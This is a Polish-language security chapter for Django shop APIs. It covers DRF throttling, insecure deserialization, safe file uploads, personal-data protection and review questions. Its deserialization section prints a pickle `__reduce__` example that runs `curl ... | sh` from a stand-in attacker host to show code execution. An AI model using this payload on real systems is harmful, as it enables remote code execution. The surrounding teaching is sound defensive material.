# API i dane

API sklepu przyjmuje dane od klientów, partnerów i integracji, a przechowuje dane osobowe tysięcy ludzi. Ten rozdział łączy cztery tematy, które pojawiają się przy projektowaniu każdego endpointu: jak nie dać się zalać żądaniami, jak bezpiecznie wczytywać dane z zewnątrz, jak przyjmować pliki i jak chronić dane osobowe przez cały ich cykl życia.

```text
żądanie ──► limit częstotliwości ──► limit rozmiaru ──► parsowanie (JSON, a nie pickle) ──► walidacja
                                                                                              │
odpowiedź ◄── tylko potrzebne pola ◄── dane osobowe szyfrowane i maskowane w logach ◄─────────┘
```

## Limity i nadużycia

Unrestricted resource consumption, czyli brak limitów zużycia zasobów, jest na czwartym miejscu OWASP API Security Top 10. Obejmuje zalewanie API żądaniami, ale też pojedyncze żądania, które są bardzo kosztowne: pobranie 100 000 wyników naraz, wyszukiwanie z wieloma filtrami, wysłanie 5000 SMS-ów z kodami.

<a id="term-rate-limiting"></a>[Rate limiting](00%20Glossary%20Security.md#rate-limiting) to ograniczenie liczby żądań w jednostce czasu dla klucza: adresu IP, użytkownika, tokenu API albo konkretnej operacji. W DRF służy do tego throttling:

```python
REST_FRAMEWORK = {
    "DEFAULT_THROTTLE_CLASSES": [
        "rest_framework.throttling.AnonRateThrottle",
        "rest_framework.throttling.UserRateThrottle",
    ],
    "DEFAULT_THROTTLE_RATES": {
        "anon": "60/min",
        "user": "600/min",
        "login": "5/min",
        "sms_code": "3/hour",
    },
    "NUM_PROXIES": 1,                 # ile proxy dodaje X-Forwarded-For, żeby IP klienta było prawdziwe
}


class SendSmsCodeView(APIView):
    throttle_classes = [ScopedRateThrottle]
    throttle_scope = "sms_code"
```

Gdzie ta ochrona się kończy:

- throttling DRF przechowuje liczniki w cache Django. Przy domyślnym cache w pamięci każdy proces ma własne liczniki, więc przy 8 workerach limit jest w praktyce 8 razy większy. Potrzebny jest wspólny cache (Redis),
- limity po adresie IP wymagają poprawnego adresu klienta za proxy. Źle ustawione `NUM_PROXIES` pozwala napastnikowi podać dowolny adres w `X-Forwarded-For` i ominąć limit,
- samo Django nie ma rate limitingu dla zwykłych widoków. Używa się `django-ratelimit` albo limitów na poziomie proxy i bramki API (nginx `limit_req`, WAF, API Gateway),
- limity częstotliwości nie chronią przed kosztownymi żądaniami.

Kosztowne żądania ogranicza się osobno:

- stronicowanie z maksymalnym rozmiarem strony (`max_page_size` w paginacji DRF), a nie parametr `?limit=100000`,
- limit rozmiaru ciała żądania: `DATA_UPLOAD_MAX_MEMORY_SIZE` (domyślnie 2,5 MB) i `DATA_UPLOAD_MAX_NUMBER_FIELDS` w Django oraz `client_max_body_size` w nginx,
- timeouty zapytań do bazy (`statement_timeout` w PostgreSQL) i żądań wychodzących,
- limity biznesowe: liczba kuponów na konto, liczba zamówień bez płatności, liczba rejestracji z jednego urządzenia. OWASP opisuje je jako nieograniczony dostęp do wrażliwych przepływów biznesowych, np. boty wykupujące limitowany towar.

## Dane, które wykonują kod

<a id="term-insecure-deserialization"></a>[Niebezpieczna deserializacja](00%20Glossary%20Security.md#insecure-deserialization) to odtwarzanie obiektów z danych pochodzących z niezaufanego źródła formatem, który pozwala wykonać kod. W Pythonie takim formatem jest `pickle`: deserializacja wywołuje metodę `__reduce__` zapisaną w danych, a ta może uruchomić dowolną funkcję.

```python
import os
import pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl https://evil.example/x.sh | sh",))

payload = pickle.dumps(Exploit())
pickle.loads(payload)          # wykonuje polecenie, zanim kod zobaczy jakikolwiek obiekt
```

Podobnie działają `yaml.load` z niebezpiecznym loaderem, `jsonpickle`, `shelve` i `marshal`. Zasada: dane z zewnątrz wczytuje się tylko formatami, które reprezentują dane, a nie obiekty. JSON przez serializer DRF albo Pydantic, YAML przez `yaml.safe_load`, CSV przez moduł `csv`.

Gdzie `pickle` pojawia się w typowym projekcie Django:

| Miejsce | Stan | Ryzyko |
|---|---|---|
| sesje | `PickleSerializer` usunięty w Django 5.0, domyślnie JSON | w starszych projektach z `signed_cookies` i wyciekiem `SECRET_KEY` prowadził do wykonania kodu |
| cache Django (Redis, Memcached) | wartości serializowane przez `pickle` | kto może zapisać do Redisa, może wykonać kod w aplikacji, więc Redis musi być w prywatnej sieci i z hasłem |
| Celery | domyślnie JSON | `accept_content = ["pickle"]` otwiera wykonanie kodu przez kolejkę |
| własny kod | `pickle.loads(request.body)`, pliki od użytkowników | wykonanie kodu |

Pokrewnym problemem jest XML. Parsery XML domyślnie potrafią dołączać zewnętrzne encje (XXE), co pozwala czytać pliki serwera albo wykonywać żądania SSRF, i rozwijać zagnieżdżone encje („billion laughs”), co zużywa całą pamięć. Import produktów od dostawców w XML parsuje się przez `defusedxml`, który blokuje te mechanizmy.

## Upload plików

Sklep przyjmuje awatary klientów, zdjęcia produktów od sprzedawców i pliki CSV z cennikami. Upload łączy kilka ryzyk naraz: wykonanie kodu, XSS, wyczerpanie zasobów i nadpisanie plików.

Django daje podstawy: `FileField` i `ImageField`, system przechowywania plików (`Storage`), który nie wychodzi poza `MEDIA_ROOT` i nadaje unikalne nazwy przy kolizji, oraz walidację obrazu przez Pillow w `ImageField`. Resztę trzeba dodać:

```python
from uuid import uuid4

from django.core.exceptions import ValidationError
from django.core.validators import FileExtensionValidator
from PIL import Image

MAX_AVATAR_BYTES = 2 * 1024 * 1024
Image.MAX_IMAGE_PIXELS = 25_000_000                     # ochrona przed bombami dekompresyjnymi


def avatar_path(instance, filename):
    return f"avatars/{uuid4().hex}.jpg"                 # nazwa z aplikacji; obraz i tak zapisujemy jako JPEG


def validate_avatar(file):
    if file.size > MAX_AVATAR_BYTES:
        raise ValidationError("Plik jest za duży")
    try:
        image = Image.open(file)
        image.verify()                                  # czy to naprawdę obraz
    except Exception:
        raise ValidationError("Plik nie jest poprawnym obrazem")
    if image.format not in {"JPEG", "PNG", "WEBP"}:
        raise ValidationError("Niedozwolony format")


class Customer(AbstractUser):
    avatar = models.ImageField(
        upload_to=avatar_path, blank=True,
        validators=[FileExtensionValidator(["jpg", "jpeg", "png", "webp"]), validate_avatar],
    )
```

Zasady:

- typ pliku sprawdza się po zawartości, a nie po rozszerzeniu ani nagłówku `Content-Type` z żądania, które ustawia klient,
- obrazy najlepiej przetworzyć ponownie (zmiana rozmiaru, zapis do JPEG). Usuwa to metadane EXIF z lokalizacją i ewentualne dodatkowe treści w pliku,
- limity rozmiaru na każdym poziomie: nginx, walidator, `Image.MAX_IMAGE_PIXELS` dla obrazów, limity rozpakowania dla archiwów (bomby ZIP),
- nazwę pliku generuje aplikacja. Oryginalną nazwę, jeśli jest potrzebna, zapisuje się w bazie jako tekst,
- pliki od użytkowników serwuje się z innej domeny (np. `usercontent.shop.example` albo bucket S3), z `X-Content-Type-Options: nosniff`, a pliki do pobrania z `Content-Disposition: attachment`. Plik HTML albo SVG wgrany jako „obraz” i otwarty z domeny sklepu to stored XSS,
- katalogu uploadu nigdy nie serwuje się przez interpreter kodu. Na produkcji Django nie serwuje plików z `MEDIA_ROOT`, robi to nginx albo magazyn obiektów,
- pliki prywatne (faktury, dokumenty) udostępnia się przez krótko ważne podpisane URL-e (S3 presigned URL) albo widok z autoryzacją, a nie przez publiczną ścieżkę,
- w systemach przyjmujących dokumenty od wielu stron warto skanować pliki antywirusem (np. ClamAV) w zadaniu w tle.

## Dane osobowe

Dane osobowe, w skrócie <a id="term-pii"></a>[PII](00%20Glossary%20Security.md#pii) (personally identifiable information), to informacje o zidentyfikowanej lub możliwej do zidentyfikowania osobie: imię, adres, e-mail, telefon, historia zamówień, adres IP. RODO wymaga ich ochrony, a ich wyciek jest zwykle najdroższym skutkiem incydentu.

Ochrona zaczyna się od zasady <a id="term-data-minimization"></a>[minimalizacji danych](00%20Glossary%20Security.md#data-minimization): nie zbiera się i nie przechowuje danych, których sklep nie potrzebuje. Dane, których nie ma, nie mogą wyciec.

Techniki w aplikacji Django:

- retencja: usuwanie lub anonimizacja danych po okresie, w którym są potrzebne (np. dane gości bez konta po zamknięciu reklamacji), przez zaplanowane zadanie,
- szyfrowanie wrażliwych pól (numer rachunku do zwrotów, numer dokumentu) na poziomie aplikacji, np. Fernetem z rozdziału 06 i własnym polem modelu, z kluczem poza bazą. Wyciek bazy albo kopii zapasowej nie ujawnia wtedy tych pól,
- pseudonimizacja w analityce i środowiskach testowych: zamiast kopiować produkcyjną bazę, generuje się dane albo zastępuje identyfikatory,
- dostęp pracowników: osobne uprawnienie na pełne dane (`view_customer_pii`), maskowanie w panelu (`a***@example.com`), dziennik audytu, kto oglądał czyje dane,
- prawa osób z RODO: eksport danych klienta i usunięcie konta, z uwzględnieniem kopii w cache, indeksie wyszukiwarki, logach i systemach partnerów,
- odpowiedzi API tylko z potrzebnymi polami (rozdział 05).

Logi są najczęstszym miejscem niekontrolowanego wycieku danych osobowych. Django pomaga przy raportach błędów, a przy zwykłych logach trzeba działać samodzielnie:

```python
from django.views.decorators.debug import sensitive_post_parameters, sensitive_variables


@sensitive_variables("card_number", "cvv")
@sensitive_post_parameters("password", "iban")
def checkout(request):
    ...                     # w raporcie błędu te wartości zostaną zastąpione gwiazdkami


class MaskEmailFilter(logging.Filter):
    EMAIL = re.compile(r"([\w.+-])[\w.+-]*@([\w-]+\.[\w.]+)")

    def filter(self, record):
        record.msg = self.EMAIL.sub(r"\1***@\2", str(record.msg))
        return True
```

- `sensitive_variables` i `sensitive_post_parameters` ukrywają wskazane zmienne i pola w raportach błędów Django (strona debug, e-maile do adminów),
- w konfiguracji Sentry: `send_default_pii=False` i `before_send` usuwający dane,
- filtr logowania maskujący adresy e-mail, numery telefonów i tokeny, ale przede wszystkim nawyk logowania identyfikatorów (`customer_id=7`), a nie danych (`email=anna@…`),
- logi, kopie zapasowe i eksporty podlegają tym samym zasadom retencji i dostępu co baza.

## Co zapamiętać

- Rate limiting w DRF to throttling z liczbami per zakres. Wymaga wspólnego cache i poprawnego IP za proxy (`NUM_PROXIES`). Dla zwykłych widoków używa się `django-ratelimit` albo limitów na proxy.
- Kosztowne żądania ogranicza się osobno: `max_page_size`, limity rozmiaru ciała, timeouty zapytań i limity biznesowe.
- `pickle`, `yaml.load` i podobne formaty wykonują kod. Dane z zewnątrz czyta się jako JSON, `safe_load`, CSV, XML przez `defusedxml`. Redis z cache Django musi być w prywatnej sieci.
- Upload: typ po zawartości, ponowne przetworzenie obrazów, limity rozmiaru i pikseli, nazwy z aplikacji, serwowanie z innej domeny z `nosniff` i `attachment`, prywatne pliki przez podpisane URL-e.
- Dane osobowe chroni minimalizacja, retencja, szyfrowanie pól, pseudonimizacja, uprawnienia i audyt dostępu pracowników.
- W logach zapisuje się identyfikatory, a nie dane. `sensitive_variables`, `sensitive_post_parameters`, filtry logowania i konfiguracja Sentry ograniczają wycieki.

## Pytania sprawdzające

### 39. Jak ograniczać liczbę żądań i chronić API przed nadużyciami (throttling w DRF, `django-ratelimit`, limity na poziomie proxy)?

<details>
<summary>Odpowiedź</summary>

Przez rate limiting per IP, użytkownik, token lub operację: w DRF throttling (`AnonRateThrottle`, `UserRateThrottle`, `ScopedRateThrottle` z `DEFAULT_THROTTLE_RATES`), w zwykłych widokach `django-ratelimit`, a przed aplikacją limity w nginx, WAF i bramce API. Pułapki: liczniki w lokalnym cache każdego procesu (potrzebny Redis) i złe `NUM_PROXIES`, które pozwala podać dowolne IP. Osobno ogranicza się kosztowne żądania: `max_page_size`, `DATA_UPLOAD_MAX_MEMORY_SIZE`, timeouty zapytań i limity biznesowe przeciw nadużyciom przepływów (kupony, SMS, boty).

Zobacz: sekcja „Limity i nadużycia”.

</details>

### 40. Dlaczego niebezpieczna deserializacja (`pickle`, `yaml.load`) prowadzi do wykonania kodu i jak jej unikać?

<details>
<summary>Odpowiedź</summary>

`pickle` odtwarza obiekty, wywołując zapisaną w danych metodę `__reduce__`, która może uruchomić dowolną funkcję, np. `os.system`, jeszcze zanim kod zobaczy obiekt. Podobnie działają `yaml.load` z niebezpiecznym loaderem, `jsonpickle`, `shelve` i `marshal`. Dane z zewnątrz czyta się formatami danych: JSON przez serializer lub Pydantic, `yaml.safe_load`, `csv`, XML przez `defusedxml` (XXE, billion laughs). W Django sesje używają JSON (pickle usunięto w 5.0), ale cache serializuje przez `pickle`, więc Redis musi być w prywatnej sieci. W Celery nie włącza się `pickle`.

Zobacz: sekcja „Dane, które wykonują kod”.

</details>

### 41. Jak bezpiecznie obsługiwać upload plików (typ, rozmiar, nazwa, miejsce przechowywania i serwowania, skanowanie)?

<details>
<summary>Odpowiedź</summary>

Typ sprawdza się po zawartości (Pillow `verify`, format), a nie po rozszerzeniu czy `Content-Type`. Obrazy przetwarza się ponownie, co usuwa EXIF i doklejone treści. Limity rozmiaru działają na każdym poziomie (nginx, walidator, `Image.MAX_IMAGE_PIXELS`, archiwa). Nazwę generuje aplikacja (UUID przez `upload_to`). Pliki serwuje się z innej domeny lub S3 z `nosniff` i `Content-Disposition: attachment` (SVG i HTML to XSS), nigdy przez interpreter i nie przez Django na produkcji. Pliki prywatne udostępnia się przez podpisane URL-e lub widok z autoryzacją, a skanowanie antywirusem robi się w tle.

Zobacz: sekcja „Upload plików”.

</details>

### 42. Jak chronić dane osobowe w aplikacji (minimalizacja, szyfrowanie pól, RODO, maskowanie w logach, `sensitive_variables`)?

<details>
<summary>Odpowiedź</summary>

Podstawą jest minimalizacja: nie zbierać zbędnych danych. Dalej: retencja z automatycznym usuwaniem lub anonimizacją, szyfrowanie wrażliwych pól na poziomie aplikacji (Fernet, klucz poza bazą), pseudonimizacja w testach i analityce, osobne uprawnienie i maskowanie w panelu z audytem dostępu pracowników, obsługa praw z RODO (eksport, usunięcie wszędzie, także w cache i indeksach) i odpowiedzi API z minimalnymi polami. W logach zapisuje się identyfikatory zamiast danych. `sensitive_variables` i `sensitive_post_parameters` ukrywają dane w raportach błędów, a pomagają też filtry logowania i Sentry z `send_default_pii=False`.

Zobacz: sekcja „Dane osobowe”.

</details>
